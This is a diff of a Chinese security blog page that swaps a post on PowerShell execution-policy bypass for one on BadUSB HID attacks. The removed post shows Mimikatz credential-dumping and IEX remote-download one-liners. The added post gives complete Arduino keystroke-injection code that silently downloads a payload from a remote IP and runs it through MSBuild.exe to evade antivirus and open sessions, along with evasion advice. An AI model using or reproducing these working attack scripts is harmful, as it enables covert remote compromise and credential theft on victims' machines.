@@ -466,7 +466,7 @@ Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log�
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">绕过Powershell执行策略执行ps脚本。</a></h1>
+                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">BadUSB:虚假的恶意USB设备</a></h1>
         
 
         <div class="post-meta">
@@ -501,8 +501,8 @@ Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log�
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Powershell/" itemprop="url" rel="index">
-                    <span itemprop="name">Powershell</span>
+                  <a href="/categories/社会工程学/" itemprop="url" rel="index">
+                    <span itemprop="name">社会工程学</span>
                   </a>
                 </span>
 
@@ -540,22 +540,86 @@ Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log�
       
         
           
-            <h1 id="绕过Powershell执行策略执行ps脚本。"><a href="#绕过Powershell执行策略执行ps脚本。" class="headerlink" title="绕过Powershell执行策略执行ps脚本。"></a>绕过Powershell执行策略执行ps脚本。</h1><blockquote>
-<p>由于powershell默认是不允许执行ps脚本的<strong>* 管理员可以改为允许 *</strong>，但ps脚本又是渗透测试中非常有用也非常必要的工具，所以想办法绕过执行策略还是非常有必要的。</p>
-</blockquote>
-<h2 id="总结如下"><a href="#总结如下" class="headerlink" title="总结如下"></a>总结如下</h2><ul>
-<li><p>本地绕过权限执行.</p>
-<pre><code>powershell -executionpolicy bypass -file xxx.ps1</code></pre></li>
-<li><p>本地隐藏绕过权限执行.</p>
-<pre><code>powershell -executionpolicy bypass -windowsstyle hideden -nologo -nonlnteractive -noprofile -file xxx.ps1</code></pre></li>
-<li><p>本地导入ps1脚本，并执行函数.</p>
-<pre><code>powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-Mimikatz.ps1&quot;;Invoke-Mimikatz -DumpCreds</code></pre></li>
-<li><p>本地使用IEX下载远程ps1绕过执行.</p>
-<pre><code>powershell.exe &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.0.1/mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds&quot;</code></pre></li>
-<li><p>本地使用IEX下载远程ps1隐藏绕过权限执行.</p>
-<pre><code>powershell -executionpolicy bypass -windowstyle hidden -nologo -noprofile IEX(new-object system.net.webclient).downloadstring(&quot;http://192.168.0.1/1025.ps1&quot;)    </code></pre><p>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/27/%E7%BB%95%E8%BF%87Powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E6%89%A7%E8%A1%8Cps%E8%84%9A%E6%9C%AC%E3%80%82/1.jpg" alt="avatar"></p>
-</li>
+            <h1 id="BadUSB-虚假的恶意USB设备"><a href="#BadUSB-虚假的恶意USB设备" class="headerlink" title="BadUSB:虚假的恶意USB设备"></a>BadUSB:虚假的恶意USB设备</h1><p>从传统意义讲，当你在电脑中插入一张CD/DVD，或者插入一个USB设备时，可以通过自动播放来运行一个包含恶意的文件，不过自动播放功能被关闭时，autorun.inf文件就无法自动执行你的文件了。然而通过BadUSB，你可以模拟出一个键盘，当你插入这个定制的USB设备时，电脑会识别为一个键盘，利用设备中的微处理器，与存储空间，和编程进去的攻击代码，就可以向主机发送控制命令，从而完全控制主机，无论自动播放是否开启，都可以成功。</p>
+<ul>
+<li>Arduino: 一款开源电子原型平台，也就是常说的开发板。</li>
+<li>Arduino UNO/Leonardo: Arduino中的两种型号</li>
+<li>HID Attacks: 通过接入伪装的设备，如U盘，达到模拟键盘输入*的攻击</li>
+<li>TEENSY: 实现HID Attacks的一种设备，类似于Arduino设备。</li>
+<li>USB RUBBER DUCKY： 实现HID Attacks的一种设备，外观和U盘无差别</li>
+<li>BadUSB：基于U盘实现HID Attacks的方式</li>
+<li>kali NetHunter：基于安卓的开源移动渗透测试平台</li>
 </ul>
+<blockquote>
+<p>当Arduino插入电脑时，Arduino将会伪装成键盘，并且自动输入Arduino中的命令。说直白点，就是一双无形的手在操控你的键盘，并且可以在极短的时间内输入事先写好的指令，让受害者毫无察觉。</p>
+</blockquote>
+<p>** 只要是能通过USB连接的设备都有可能被植入攻击芯片，此攻击芯片是一个非常小巧且功能完整的单片机开发系统，也是BadUSB的核心。**</p>
+<p>在这里将会使用最常见的U盘实现BadUSB攻击演示。</p>
+<h2 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h2><pre><code>#include &lt;Keyboard.h&gt;
+void setup() {//初始化
+Keyboard.begin();//开始键盘通讯
+delay(5000);//延时
+Keyboard.press(KEY_LEFT_GUI);//win键
+delay(500);
+Keyboard.press(&apos;r&apos;);//r键
+delay(500);
+Keyboard.release(KEY_LEFT_GUI);
+Keyboard.release(&apos;r&apos;);
+Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
+Keyboard.release(KEY_CAPS_LOCK);
+delay(500);
+Keyboard.println(&quot;cmd&quot;);
+delay(500);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+delay(100);
+Keyboard.println(&quot;powershell -w hidden Invoke-WebRequest -uri   http://172.22.35.106/PAYLOAD1.XML -OutFile   1025.xml;C:/Windows/Microsoft.NET/Framework/v4.0.30319/MSBuild.exe 1025.xml&quot;);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+delay(500);
+Keyboard.press(KEY_CAPS_LOCK);
+Keyboard.release(KEY_CAPS_LOCK);
+Keyboard.end();//结束键盘通讯
+}
+void loop()//循环
+{
+Keyboard.begin();//开始键盘通讯
+delay(5000);//延时
+Keyboard.press(KEY_LEFT_GUI);//win键
+delay(500);
+Keyboard.press(&apos;r&apos;);//r键
+delay(500);
+Keyboard.release(KEY_LEFT_GUI);
+Keyboard.release(&apos;r&apos;);
+Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
+Keyboard.release(KEY_CAPS_LOCK);
+delay(500);
+Keyboard.println(&quot;cmd&quot;);
+delay(500);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+delay(100);
+Keyboard.println(&quot;POWERSHELL -W HIDDEN INVOKE-WEBREQUEST -URI HTTP://172.22.35.106/PAYLOAD1.XML -OUTFILE 1025.XML;C:/WINDOWS/Microsoft.NET/Framework/v4.0.30319/MSBuild.exe 1025.XML&quot;);
+Keyboard.press(KEY_RETURN);
+Keyboard.release(KEY_RETURN);
+delay(500);
+Keyboard.press(KEY_CAPS_LOCK);
+Keyboard.release(KEY_CAPS_LOCK);
+Keyboard.end();//结束键盘通讯
+}</code></pre><blockquote>
+<p>这里使用了白名单中的MSBuid.exe以达到免杀的目的，首先从服务器下载payload文件，然后用MSBuid.exe执行返回session。然后重复，不过usb插入几秒就够了，重复也不过是多返回几个session而已。</p>
+</blockquote>
+<p>  <strong>正因为HID攻击对于大众来说还属于冷门，人们甚至不知道它的存在，防范更是无从谈起，但它的危害却是非常大的，USB设备的普及更是放大了它的危害性。所有这一切都是因为连接到目标机器时的假USB是用另一个不是原设备（就像它们原本的那样）的固件执行的，冒充任何其他类型的设备并且能够执行任何类型它所连接的机器上的操作，而无需用户许可。</strong></p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><blockquote>
+<p>HID攻击对某些没有外接设备的终端设备有奇效，只要有USB口就可以尝试攻击。</p>
+</blockquote>
+<blockquote>
+<p>HID攻击本身是不会被拦截的，行为可能会被拦截，这时候就得改变payload了。</p>
+</blockquote>
+<blockquote>
+<p>HID：Human Interface Device的缩写，直接与人交互的设备，例如键盘、鼠标。</p>
+</blockquote>
+<p>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/26/BadUSB%E6%B5%85%E6%9E%90/1.png" alt="avatar"></p>
 
           
         
